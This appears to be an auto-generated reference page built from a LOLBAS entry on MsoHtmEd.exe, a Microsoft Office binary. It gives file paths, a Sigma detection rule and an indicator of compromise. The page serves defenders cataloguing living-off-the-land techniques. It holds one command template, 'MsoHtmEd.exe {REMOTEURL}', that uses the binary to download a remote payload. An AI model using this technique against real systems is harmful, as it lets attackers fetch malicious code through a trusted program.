---
parsed_by: focuslocust
source: lolbas
type: generated
---
# MsoHtmEd.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msohtmed.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/MsoHtmEd.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [MsoHtmEd.exe](../../tools/windows/msohtmed.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | msohtmed.exe |
| name | MsoHtmEd.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@C_h4ck_0'
  Person: Nir Chako (Pentera)
Author: Nir Chako
Commands:
- Category: Download
  Command: MsoHtmEd.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2022-07-24
Description: Microsoft Office component
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_msohtmed_download.yml
- IOC: Suspicious Office application internet/network traffic
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office\Office16\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office\Office15\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office14\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office\Office14\MSOHTMED.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office12\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office\Office12\MSOHTMED.exe
- Path: C:\Program Files\Microsoft Office\Office12\MSOHTMED.exe
Name: MsoHtmEd.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/MsoHtmEd.yml
```

## Detection / Analysis Notes

```text
IOC: Suspicious Office application internet/network traffic
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_msohtmed_download.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_msohtmed_download.yml
- IOC: Suspicious Office application internet/network traffic
```
